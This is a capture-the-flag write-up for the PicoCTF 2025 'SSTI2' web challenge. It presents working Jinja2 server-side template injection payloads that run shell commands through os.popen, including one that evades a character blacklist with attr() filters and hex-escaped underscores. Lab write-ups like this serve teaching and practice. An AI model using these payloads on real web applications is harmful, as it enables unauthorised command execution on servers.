# SSTI2
This was a challenge listed in PicoCTF 2025.  It's listed as medium and categorized as a Web Exploitation challenge.

## Description
The Description reads:
> I made a cool website where you can announce whatever you want!  
> I read about input sanitization, so now I remove any kind of characters that could be a problem :)

## Hints
There are two hints for this challenge:
> Server Side Template Injection
> Why is blacklisting characters a bad idea to sanitize input?

# Solving
## My Thoughts
This was a small expansion on the SSTI challenge from before that had to do with avoiding character blacklisting on the input.  It honestly just made the last task annoyingly difficult.

## SSTI Again
Using the same injection testing method as last time, by entering {{7*'7'}} we can immediately confirm that template injection is indeed a possibility:

![Injection](https://github.com/user-attachments/assets/51d42ffb-7f5a-488e-b274-7cc81478a6a3)

Ok well lets toss in the string that worked for us last time:  
``` {{ dict.__base__.__subclasses__()[356]('cat flag',shell=True,stdout=-1).communicate()[0].strip() }} ```

![:(](https://github.com/user-attachments/assets/4b933d4e-319a-4720-b00d-3ccdc79d3a11)

Well that's not fun, what now?

## Finding Blacklisted Characters
This was the most tedious part, figuring out exactly what characters were blacklisted so we could get around it.  I started by just entering the below string to see what characters triggered problems:

``` abcdefghijklmnopqrstuvwxyz1234567890~`@#$%^&*()_-+={}[]|\:;"'<,>.?/ ```

and was given the below:

``` abcdefghijklmnopqrstuvwxyz1234567890~`@#$%^&*()-+={}|\:;"'<,>?/ ```

So the characters we are unable to user are: _, ], [, and ..  That makes things pretty difficult considering how often those characters appear in our working string.

![image](https://github.com/user-attachments/assets/1a8f9310-c72d-4859-bde7-fea669711141)

## Solution

I'm going to approach this by first dropping my payload/string and then explaining it.  This took a VERY long time to figure out so save yourself some time:

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag*')|attr('read')()}}
```

[This](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) site helped me to avoid ripping my hair out as I tried to solve this.  The command listed partway down the page worked right out of the box, I adjusted it slightly to make it work.  Now I'll try to attempt to explain what exactly it does.

This method essentially uses a very similar method to mine, except it uses the request function instead of dict.  So the non-obfuscated version would look like this:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag*').read()}}
```

Let's focus on the periods first, in jinja2 you can access the 'attributes' of a given thing by using 'attr()', you can pass in a value to pull attributes from using '|'.  By using this we can turn a string like:

```
{{request.application}}
```

into

```
{{request|attr('application')}}
```

Great! Second challeng is going to be dealing with those pesky underscores, fortunately we're dealing with python which will interpret hex data within the quotation marks and turn it back into ascii.  The hex code for an underscore is \x5f, so let's update our string with some more stuff:

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
```

We then just combine those two methods until we fully transform our original string into one that'll bypass the blacklisting.  When we enter in our good string we get the below:

![Gottem](https://github.com/user-attachments/assets/843dd5ec-5301-422a-abe5-7f50ca83f173)
